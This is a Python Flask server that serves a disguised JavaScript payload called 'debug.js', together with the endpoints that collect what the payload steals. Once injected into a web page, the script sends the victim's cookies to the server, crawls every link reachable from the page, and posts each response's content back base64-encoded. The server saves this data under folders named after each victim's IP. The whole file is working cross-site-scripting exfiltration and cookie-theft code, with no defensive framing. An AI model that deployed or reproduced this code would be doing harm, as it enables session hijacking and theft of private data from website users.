#!/usr/bin/env python3

import sys
import re
import os
import base64
import datetime
from flask import Flask, request, make_response, jsonify

app = Flask(__name__)


# Configuration
HOST = "0.0.0.0"
PORT = 5000


if len(sys.argv) > 1:
    HOST = sys.argv[1]
if len(sys.argv) > 2:
    PORT = int(sys.argv[2])



# Serve debug.js
@app.route("/debug.js", methods=["GET"])
def debug_js():
    """
    Returns a JavaScript file that:
      1. Captures cookies (document.cookie) and sends to /cookies.
      2. Finds links in the DOM.
      3. Fetches each link (fetch then XHR fallback).
      4. Base64-encodes the content.
      5. POSTs it to /receive.
      6. Recursively crawls new links discovered in any HTML response.
    """

    post_url = f"http://{HOST}:{PORT}/receive"
    cookies_url = f"http://{HOST}:{PORT}/cookies"

    js_code = f"""
(function() {{
    // Keep track of visited URLs
    const visited = new Set();

    // Where we POST data
    const POST_URL = "{post_url}";
    // Where we POST cookies
    const COOKIES_URL = "{cookies_url}";

    // 1. Send cookies
    function sendCookies() {{
        try {{
            const cookies = document.cookie;
            if (!cookies) {{
                console.log("No cookies found or none accessible via JavaScript.");
                return;
            }}
            // Post them to /cookies
            const body = JSON.stringify({{ cookies: cookies }});
            fetch(COOKIES_URL, {{
                method: "POST",
                headers: {{
                    "Content-Type": "application/json"
                }},
                body: body
            }})
            .then(r => {{
                if (!r.ok) {{
                    console.warn("Failed to send cookies:", r.status);
                }} else {{
                    console.log("Cookies sent successfully.");
                }}
            }})
            .catch(e => {{
                console.warn("Error sending cookies:", e);
            }});
        }} catch (err) {{
            console.warn("Error reading cookies:", err);
        }}
    }}

    // 2. Extract links from HTML
    function extractLinks(html, baseUrl) {{
        const urlRegex = /(?:href|src)=["']([^"']+)["']/gi;
        const found = [];
        let match;
        while ((match = urlRegex.exec(html)) !== null) {{
            try {{
                const absolute = new URL(match[1], baseUrl).href;
                found.push(absolute);
            }} catch(e) {{
                console.warn("Invalid URL in HTML:", match[1], e);
            }}
        }}
        return found;
    }}

    // 3. POST base64 content to /receive
    async function postBase64(url, b64Data) {{
        const body = JSON.stringify({{ url: url, content: b64Data }});
        // Try fetch
        try {{
            const resp = await fetch(POST_URL, {{
                method: "POST",
                headers: {{
                    "Content-Type": "application/json"
                }},
                body: body
            }});
            if (!resp.ok) {{
                console.warn("POST via fetch failed:", url, resp.status);
            }}
        }} catch(err) {{
            console.warn("fetch POST error, fallback to XHR:", err);
            // Fallback to XHR
            const xhr = new XMLHttpRequest();
            xhr.open("POST", POST_URL, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(body);
        }}
    }}

    // 4. Request a URL with fetch, fallback to XHR, then parse for new links if HTML
    async function requestUrl(url) {{
        if (visited.has(url)) return;
        visited.add(url);

        console.log("Fetching:", url);

        // Attempt fetch
        try {{
            const resp = await fetch(url);
            if (!resp.ok) {{
                console.warn("Non-OK response for:", url, resp.status);
                return;
            }}
            const blob = await resp.blob();
            return new Promise((resolve) => {{
                const reader = new FileReader();
                reader.onload = async function(e) {{
                    // e.g. data:;base64,XYZ
                    const fullDataUrl = e.target.result;
                    const base64part = fullDataUrl.split(",")[1];
                    await postBase64(url, base64part);

                    // If HTML, extract more links
                    const contentType = resp.headers.get("Content-Type") || "";
                    if (contentType.includes("text/html")) {{
                        const text = atob(base64part);
                        const newLinks = extractLinks(text, url);
                        newLinks.forEach(l => requestUrl(l));
                    }}
                    resolve();
                }};
                reader.readAsDataURL(blob);
            }});
        }} catch (err) {{
            console.warn("Fetch error for:", url, err);

            // Fallback to XHR
            return new Promise((resolve) => {{
                const xhr = new XMLHttpRequest();
                xhr.open("GET", url, true);
                xhr.responseType = "blob";
                xhr.onload = async function() {{
                    if (xhr.status === 200) {{
                        const reader = new FileReader();
                        reader.onloadend = async function() {{
                            const base64part = reader.result.split(",")[1];
                            await postBase64(url, base64part);

                            // If HTML
                            const contentType = xhr.getResponseHeader("Content-Type") || "";
                            if (contentType.includes("text/html")) {{
                                const text = atob(base64part);
                                const newLinks = extractLinks(text, url);
                                newLinks.forEach(l => requestUrl(l));
                            }}
                            resolve();
                        }};
                        reader.readAsDataURL(xhr.response);
                    }} else {{
                        console.warn("XHR non-200 for:", url, xhr.status);
                        resolve();
                    }}
                }};
                xhr.onerror = function() {{
                    console.warn("XHR error for:", url);
                    resolve();
                }};
                xhr.send();
            }});
        }}
    }}

    // 5. Gather all initial links in the DOM
    function gatherLinks() {{
        const sel = "a[href], link[href], script[src], img[src]";
        const nodes = document.querySelectorAll(sel);
        const links = [];
        nodes.forEach(el => {{
            const val = el.getAttribute("href") || el.getAttribute("src");
            if (val) {{
                try {{
                    links.push(new URL(val, document.location.href).href);
                }} catch (e) {{
                    console.warn("Invalid link:", val, e);
                }}
            }}
        }});
        return links;
    }}

    // 6. Main entry
    function main() {{
        console.log("debug.js loaded. Sending cookies + collecting links...");
        sendCookies();  // Attempt to send cookies first

        const initial = gatherLinks();
        initial.forEach(link => requestUrl(link));
    }}

    main();
}})();
"""

    response = make_response(js_code, 200)
    response.headers["Content-Type"] = "application/javascript"
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response

# Route to Receive Crawled Content
@app.route("/receive", methods=["POST", "OPTIONS"])
def receive_data():
    """
    Receives JSON:
      {
        "url": "<original URL>",
        "content": "<base64 data>"
      }
    Decodes and saves to local file in a subfolder named after the source IP.
    """
    if request.method == "OPTIONS":
        resp = make_response()
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp

    data = request.get_json(silent=True, force=True)
    if not data or "url" not in data or "content" not in data:
        return jsonify({"status": "error", "message": "Invalid payload"}), 400

    source_ip = request.remote_addr or "unknown_ip"
    safe_ip = re.sub(r"[^a-zA-Z0-9_\\-\\.]", "_", source_ip)

    content_b64 = data["content"]
    url = data["url"]

    try:
        decoded = base64.b64decode(content_b64)
    except Exception as ex:
        return jsonify({"status": "error", "message": str(ex)}), 400

    safe_url = re.sub(r"[^a-zA-Z0-9_\\-\\.]", "_", url)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"dump_{timestamp}_{safe_url[:50]}.bin"

    os.makedirs(safe_ip, exist_ok=True)

    full_path = os.path.join(safe_ip, filename)

    with open(full_path, "wb") as f:
        f.write(decoded)

    print(f"[+] Saved content from {url} to {full_path}")

    resp = make_response(jsonify({"status": "ok", "filename": full_path}), 200)
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return resp


# Route to Receive Cookies
@app.route("/cookies", methods=["POST", "OPTIONS"])
def receive_cookies():
    """
    Receives JSON:
      { "cookies": "..." }
    Saves them in a local file in the subfolder named after the source IP.
    """

    if request.method == "OPTIONS":
        resp = make_response()
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp

    data = request.get_json(silent=True, force=True)
    if not data or "cookies" not in data:
        return jsonify({"status": "error", "message": "Invalid payload"}), 400

    source_ip = request.remote_addr or "unknown_ip"
    safe_ip = re.sub(r"[^a-zA-Z0-9_\\-\\.]", "_", source_ip)
    cookies_str = data["cookies"]

    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"cookies_{timestamp}.txt"

    os.makedirs(safe_ip, exist_ok=True)

    full_path = os.path.join(safe_ip, filename)

    with open(full_path, "w") as f:
        f.write(cookies_str)

    print(f"[+] Saved cookies from IP={source_ip} to {full_path}")

    resp = make_response(jsonify({"status": "ok", "filename": full_path}), 200)
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return resp


if __name__ == "__main__":
    print(f"Serving debug.js at http://{HOST}:{PORT}/debug.js")
    print(f"POST receiving at http://{HOST}:{PORT}/receive (for content)")
    print(f"POST receiving at http://{HOST}:{PORT}/cookies (for cookies)")
    app.run(host=HOST, port=PORT, debug=True)
